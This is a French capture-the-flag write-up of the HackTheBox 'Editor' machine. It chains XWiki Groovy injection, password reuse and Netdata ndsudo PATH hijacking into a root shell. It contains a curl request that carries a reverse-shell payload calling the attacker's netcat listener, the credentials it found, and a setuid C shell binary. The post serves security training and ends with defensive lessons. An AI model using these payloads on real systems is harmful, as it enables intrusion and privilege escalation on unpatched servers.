@@ -1,0 +1,479 @@
+﻿---
+title: "Editor"
+date: "2025-08-13"
+tags:
+  [
+    "port-enumeration",
+    "remote-code-execution",
+    "privilege-escalation",
+    "sudo-exploit",
+    "rce",
+  ]
+draft: false
+summary: >-
+  RCE non authentifiée sur XWiki (CVE-2024-24893) pour obtenir un shell xwiki,
+  mouvement latéral vers utilisateur via réutilisation de mot de passe MySQL, puis
+  escalade de priviléges à root via Netdata ndsudo (CVE-2024-32019).
+images:
+  - /static/images/editor/editor_logo.png
+---
+
+## Introduction
+
+Editor est une machine Linux de difficulté moyenne sur HackTheBox qui illustre parfaitement une chaîne d'exploitation typique : RCE via une application web vulnérable → accès utilisateur → escalade de privilèges via un binaire SUID mal configuré. Cette machine est particulièrement intéressante car elle met en lumière des vulnérabilités réelles (CVE-2024-24893 sur XWiki et CVE-2024-32019 sur Netdata).
+
+## Reconnaissance
+
+### Scan des ports
+
+**Sur la machine attaquante (Kali) :**
+
+```bash
+┌──(nnbb㉿kali)-[~/Machines_HTB/Editor]
+└──$ nmap -sC -sV 10.10.11.80
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 19:54 CEST
+Nmap scan report for 10.10.11.80
+Host is up (0.33s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+8080/tcp open  http    Jetty 10.0.20
+```
+
+**Résultats clés :**
+
+- **Port 22** : SSH OpenSSH 8.9p1
+- **Port 80** : Nginx 1.18.0
+- **Port 8080** : Jetty 10.0.20 hébergeant XWiki
+
+Le port 8080 attire immédiatement notre attention avec XWiki, une plateforme wiki collaborative écrite en Java. Le `robots.txt` révèle de nombreux endpoints intéressants sous `/xwiki/bin/`.
+
+### Énumération Web
+
+**Sur la machine attaquante :**
+
+```bash
+# Ajout dans /etc/hosts
+┌──(nnbb㉿kali)-[~/Machines_HTB/Editor]
+└──$ echo "10.10.11.80 editor.htb" >> /etc/hosts
+
+# énumération des répertoires
+┌──(nnbb㉿kali)-[~/Machines_HTB/Editor]
+└──$ gobuster dir -u http://editor.htb -w /usr/share/wordlists/dirb/common.txt
+/assets               (Status: 301) [Size: 178] [--> http://editor.htb/assets/]
+/index.html           (Status: 200) [Size: 631]
+```
+
+L'interface XWiki sur le port 8080 est accessible publiquement à `http://editor.htb:8080/xwiki/bin/view/Main/`
+
+## Exploitation Initiale - CVE-2024-24893
+
+### Comprendre la vulnérabilité
+
+XWiki Platform 15.10.10 est vulnérable à une injection de code Groovy non authentifiée via l'endpoint `/bin/get/Main/SolrSearch`. Cette vulnérabilité permet l'exécution de code arbitraire sans authentification.
+
+**Pourquoi ça fonctionne ?**
+
+- XWiki utilise Groovy comme langage de script
+- L'endpoint SolrSearch ne valide pas correctement les entrées
+- Le code Groovy injecté est exécuté avec les privilèges de l'application
+
+### Test de la vulnérabilité
+
+**Sur la machine attaquante :**
+
+```bash
+┌──(nnbb㉿kali)-[~/Machines_HTB/Editor]
+└──$ python3 exploit_xwiki_rce.py
+================================================================================
+Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code Execution
+================================================================================
+[?] Enter the target URL (without http/https): editor.htb:8080
+[!] HTTPS not available, falling back to HTTP.
+[?] Target supports HTTP: http://editor.htb:8080
+[+] Sending request to: http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=...
+[?] Exploit successful! Output received:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+[...]
+xwiki:x:997:997:XWiki:/var/lib/xwiki:/usr/sbin/nologin
+netdata:x:996:999:netdata:/opt/netdata:/usr/sbin/nologin
+oliver:x:1000:1000:,:/home/oliver:/bin/bash
+```
+
+Le serveur exécute notre commande et renvoie le contenu de `/etc/passwd`, confirmant la vulnérabilité. On identifie des utilisateurs intéressants :
+
+- **xwiki** : utilisateur de l'application
+- **oliver** : utilisateur systéme avec shell bash
+- **netdata** : utilisateur pour le service de monitoring
+
+### Obtention d'un Shell
+
+**Sur la machine attaquante (terminal 1) :**
+
+```bash
+┌──(nnbb㉿kali)-[~/Machines_HTB/Editor]
+└──$ nc -lvnp 4444
+listening on [any] 4444 ...
+```
+
+**Sur la machine attaquante (terminal 2) :**
+
+```bash
+┌──(nnbb㉿kali)-[~/Machines_HTB/Editor]
+└──$ curl -G "http://10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch" \
+     --data-urlencode "media=rss" \
+     --data-urlencode "text=}}}{{async async=false}}{{groovy}}['bash','-c','busybox nc 10.10.14.162 4444 -e sh'].execute(){{/groovy}}{{/async}}"
+```
+
+**Retour sur terminal 1 :**
+
+```bash
+connect to [10.10.14.162] from (UNKNOWN) [10.10.11.80] 47896
+whoami
+xwiki
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+xwiki@editor:/var/lib/xwiki$
+```
+
+Nous obtenons un shell en tant qu'utilisateur `xwiki`.
+
+## Énumération avec LinPEAS
+
+### Déploiement de LinPEAS
+
+LinPEAS est un script d'énumération automatique qui identifie les vecteurs potentiels d'escalade de priviléges.
+
+**Sur la machine attaquante :**
+
+```bash
+┌──(nnbb㉿kali)-[~/Machines_HTB/Editor]
+└──$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 ...
+```
+
+**Sur la cible (shell xwiki) :**
+
+```bash
+xwiki@editor:/var/lib/xwiki$ cd /tmp
+xwiki@editor:/tmp$ wget http://10.10.14.162:8080/linpeas.sh
+--2025-08-11 13:45:23--  http://10.10.14.162:8080/linpeas.sh
+Connecting to 10.10.14.162:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 847920 (828K)
+Saving to: 'linpeas.sh'
+
+xwiki@editor:/tmp$ chmod +x linpeas.sh
+xwiki@editor:/tmp$ ./linpeas.sh -r | tee linpeas_output.txt
+```
+
+### Analyse des résultats LinPEAS
+
+LinPEAS révéle plusieurs informations critiques :
+
+```bash
+════════════ SUID - Check easy privesc, exploits and write perms
+https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+-rwsr-x--- 1 root netdata 200K Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
+-rwsr-x--- 1 root netdata 80K Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ioping
+-rwsr-x--- 1 root netdata 48K Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
+
+════════════ Interesting Files - Passwords in Config Files
+/etc/xwiki/hibernate.cfg.xml
+
+════════════ Active Ports
+tcp  LISTEN  0  128  127.0.0.1:19999  # Netdata dashboard
+tcp  LISTEN  0  151  127.0.0.1:3306   # MySQL
+```
+
+## Mouvement Latéral : xwiki → oliver
+
+### Énumération du système
+
+**Sur la cible (shell xwiki) :**
+
+```bash
+xwiki@editor:/tmp$ grep -r "jdbc:mysql" /etc 2>/dev/null
+/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true</property>
+
+xwiki@editor:/tmp$ cat /etc/xwiki/hibernate.cfg.xml | grep -A2 -B2 password
+    <property name="hibernate.connection.username">xwiki</property>
+    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
+    <property name="hibernate.connection.driver_class">com.mysql.cj.jdbc.Driver</property>
+```
+
+### Exploitation des credentials
+
+Le fichier `/etc/xwiki/hibernate.cfg.xml` contient les credentials MySQL : `xwiki:theEd1t0rTeam99`
+
+**Tentative de connexion SSH avec réutilisation de mot de passe :**
+
+**Sur la machine attaquante :**
+
+```bash
+┌──(nnbb㉿kali)-[~/Machines_HTB/Editor]
+└──$ ssh oliver@10.10.11.80
+oliver@10.10.11.80's password: theEd1t0rTeam99
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)
+oliver@editor:~$
+```
+
+✅ **Succès !** Le mot de passe MySQL fonctionne pour oliver via SSH.
+
+### Récupération du flag user
+
+**Sur la cible (session SSH oliver) :**
+
+```bash
+oliver@editor:~$ cat user.txt
+00e**************************b2e
+
+oliver@editor:~$ id
+uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
+```
+
+## Escalade de Privilèges : oliver → root
+
+### Énumération des privilèges
+
+**Sur la cible (session SSH oliver) :**
+
+```bash
+oliver@editor:~$ sudo -l
+[sudo] password for oliver: theEd1t0rTeam99
+Sorry, user oliver may not run sudo on editor.
+
+oliver@editor:~$ groups
+oliver netdata
+```
+
+Oliver fait partie du groupe `netdata`, ce qui est inhabituel et mérite investigation.
+
+### Découverte des binaires SUID
+
+**Sur la cible :**
+
+```bash
+oliver@editor:~$ find / -perm -4000 2>/dev/null | grep -v snap
+/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
+/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
+/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
+/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
+/opt/netdata/usr/libexec/netdata/plugins.d/ioping
+/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
+/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
+[...]
+```
+
+### Analyse de ndsudo
+
+**Sur la cible :**
+
+```bash
+oliver@editor:~$ ls -la /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
+-rwsr-x--- 1 root netdata 200576 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
+
+oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo -h
+ndsudo
+(C) Netdata Inc.
+A helper to allow Netdata run privileged commands.
+The following commands are supported:
+- Command    : nvme-list
+  Executables: nvme
+- Command    : megacli-disk-info
+  Executables: megacli MegaCli
+```
+
+`ndsudo` est un wrapper SUID qui permet d'exécuter certaines commandes système avec les privilèges root.
+
+### CVE-2024-32019 : Exploitation de ndsudo
+
+#### Comprendre la vulnérabilité
+
+`ndsudo` souffre d'une vulnérabilité de type "untrusted search path". Le binaire cherche les commandes (nvme, megacli) dans le PATH de l'utilisateur au lieu d'utiliser des chemins absolus.
+
+#### Méthode 1 : Exploitation manuelle
+
+**Sur la cible :**
+
+```bash
+oliver@editor:~$ cat > /tmp/nvme << 'EOF'
+#!/bin/bash
+cat /root/root.txt
+EOF
+oliver@editor:~$ chmod +x /tmp/nvme
+
+oliver@editor:~$ PATH=/tmp:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
+cat: /root/root.txt: Permission denied
+uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
+oliver
+Script executed!
+```
+
+Le script s'exécute mais sans priviléges root car Linux drop les priviléges SUID pour les scripts shell.
+
+#### Méthode 2 : Exploitation avec script Python automatisé
+
+Le script d'exploitation est disponible sur GitHub :
+https://github.com/dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation/blob/main/CVE-2024-32019-dbs.py
+
+**Sur la machine attaquante :**
+
+```bash
+┌──(nnbb㉿kali)-[~/Machines_HTB/Editor]
+└──$ wget https://raw.githubusercontent.com/dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation/main/CVE-2024-32019-dbs.py
+
+┌──(nnbb㉿kali)-[~/Machines_HTB/Editor]
+└──$ pip install paramiko colorama
+
+┌──(nnbb㉿kali)-[~/Machines_HTB/Editor]
+└──$ python3 CVE-2024-32019-dbs.py
+
+🔧 Netdata ndsudo Exploit Tool (CVE-2024-32019)
+
+Target IP/Host: 10.10.11.80
+SSH Port [default=22]: 22
+Username: oliver
+Password: [theEd1t0rTeam99]
+[*] Compiling C binary...
+[+] Binary compiled: /tmp/tmpx0yiimik
+[*] Connecting to target...
+[+] SSH connection successful.
+
+=== 🔍 Vulnerability Check: CVE-2024-32019 ===
+
+[+] Found ndsudo binary: /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
+[+] ndsudo is SUID and owned by root.
+[+] External command references found in ndsudo:
+nvme-list
+nvme
+nvme-smart-log
+[+] This suggests the binary relies on PATH. Likely vulnerable.
+[*] Transferring binary to target...
+[+] Created remote directory: /tmp/fakebin
+[+] Uploaded to /tmp/fakebin/nvme
+
+=== 💥 Running Exploit ===
+
+Last login: Tue Aug 12 17:54:45 2025 from 10.10.14.143
+export PATH=/tmp/fakebin:$PATH
+echo "[*] PATH is: $PATH"
+[*] PATH is: /tmp/fakebin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+which nvme
+/tmp/fakebin/nvme
+/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
+id
+uid=0(root) gid=0(root) groups=0(root),999(netdata),1000(oliver)
+[+] Root access confirmed.
+
+=== 💻 Interactive Root Shell ===
+
+whoami
+root
+root@editor:/home/oliver# cat /root/root.txt
+28a**************************637
+```
+
+#### Comment fonctionne le script
+
+Le script automatise l'exploitation en :
+
+1. **Compilant un binaire C** sur la machine attaquante :
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main() {
+    setuid(0);
+    setgid(0);
+    execl("/bin/bash", "bash", NULL);
+    return 0;
+}
+```
+
+2. **Transférant le binaire** via SFTP vers `/tmp/fakebin/nvme` sur la cible
+
+3. **Exploitant la vulnérabilité** en modifiant le PATH :
+
+```bash
+PATH=/tmp/fakebin:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
+```
+
+4. **Obtenant un shell root interactif**
+
+### Obtention du flag root
+
+**Sur la cible (shell root) :**
+
+```bash
+root@editor:/home/oliver# id
+uid=0(root) gid=0(root) groups=0(root),999(netdata),1000(oliver)
+
+root@editor:/home/oliver# cat /root/root.txt
+28a**************************637
+```
+
+## Leçons de Sécurité
+
+### 1. **Sécurisation des applications web**
+
+- Toujours valider et assainir les entrées utilisateur
+- Désactiver l'exécution de code dynamique en production
+- Implémenter une authentification forte sur tous les endpoints
+
+### 2. **Gestion des mots de passe**
+
+- Ne jamais réutiliser les mots de passe entre services
+- Utiliser des gestionnaires de secrets
+- Implémenter le principe du moindre privilège
+
+### 3. **Binaires SUID**
+
+- Toujours utiliser des chemins absolus
+- Nettoyer l'environnement (PATH, LD_LIBRARY_PATH)
+- Auditer régulièrement : `find / -perm -4000`
+- Préférer les capabilities Linux aux SUID quand possible
+
+### 4. **L'importance de l'énumération**
+
+LinPEAS nous a permis d'identifier rapidement :
+
+- Les binaires SUID non-standard dans `/opt/netdata/`
+- L'appartenance d'oliver au groupe `netdata`
+- Les fichiers de configuration contenant des mots de passe
+
+### 5. **Défense en profondeur**
+
+```yaml
+Recommandations:
+  - Segmentation réseau: Isoler les services critiques
+  - Monitoring: Détecter les nouveaux binaires SUID
+  - Updates: Maintenir les applications à jour
+  - Audit: Revue réguliére des permissions
+- HIDS: Implémenter des systèmes de détection d'intrusion
+```
+
+## Conclusion
+
+Cette machine illustre parfaitement une chaîne d'attaque réaliste :
+
+1. **Reconnaissance** → Identification d'XWiki sur port 8080
+2. **Exploitation Web** → RCE via CVE-2024-24893 (injection Groovy)
+3. **Énumération** → LinPEAS révèle les binaires SUID et mots de passe
+4. **Mouvement latéral** → Réutilisation du mot de passe MySQL
+5. **Escalade de privilèges** → Exploitation de CVE-2024-32019 (PATH hijacking)
+
+Les vulnérabilités exploitées sont des problèmes réels qui affectent des milliers de serveurs en production. L'utilisation d'outils comme LinPEAS pour l'énumération et de scripts d'exploitation automatisés (comme celui de GitHub) rend l'attaque reproductible et efficace.
+
+**Points clés à retenir :**
+
+- Les binaires SUID restent une surface d'attaque critique en 2025
+- L'énumération automatisée avec LinPEAS est essentielle
+- Les applications tierces (Netdata, XWiki) introduisent souvent des vulnérabilités
+- La réutilisation de mots de passe facilite grandement le mouvement latéral
+- Une simple erreur de validation PATH peut compromettre tout un système
+
+Cette machine est un excellent terrain d'entraînement pour comprendre les vulnérabilités communes en environnement Linux et l'importance d'une sécurisation appropriée des services web et des privilèges système.
